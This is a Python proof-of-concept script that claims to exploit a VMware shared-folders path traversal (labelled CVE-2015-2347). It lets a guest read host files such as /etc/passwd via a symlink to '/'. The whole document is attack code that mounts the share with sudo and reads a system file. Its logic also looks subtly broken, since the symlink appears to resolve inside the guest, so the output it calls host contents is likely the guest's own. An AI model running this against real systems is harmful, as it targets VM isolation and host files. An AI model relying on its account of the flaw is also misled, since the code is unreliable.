#!/usr/bin/env python3
#
# PoC for VMware Workstation/Player Shared-Folders path traversal
# CVE-2015-2347
#
# Demonstrates how a malicious guest can traverse out of the shared
# folder mountpoint and read arbitrary host files via symlink abuse.

import os

SHARE_MOUNT = "/mnt/hgfs/shared"    # assume VMware Tools auto-mount here
HOST_TARGET   = "/etc/passwd"       # host file we want to read
GUEST_SYMLINK = os.path.join(SHARE_MOUNT, "evilroot")

def mount_shared_folder():
    # If not already mounted, mount the VMware shared folder
    os.system(f"sudo mount -t vmhgfs .host:/shared {SHARE_MOUNT}")

def create_symlink():
    # Create a symlink inside the shared folder that points to host root
    try:
        os.remove(GUEST_SYMLINK)
    except FileNotFoundError:
        pass
    os.symlink("/", GUEST_SYMLINK)
    print(f"[+] Created symlink {GUEST_SYMLINK} → /")

def read_host_file():
    # Use the symlink to escape the shared-folder sandbox
    path = os.path.join(GUEST_SYMLINK, HOST_TARGET.lstrip("/"))
    try:
        with open(path, "r") as f:
            print(f"[+] Contents of {HOST_TARGET} on host:\n")
            print(f.read())
    except Exception as e:
        print(f"[-] Failed to read host file: {e}")

if __name__ == "__main__":
    mount_shared_folder()
    create_symlink()
    read_host_file()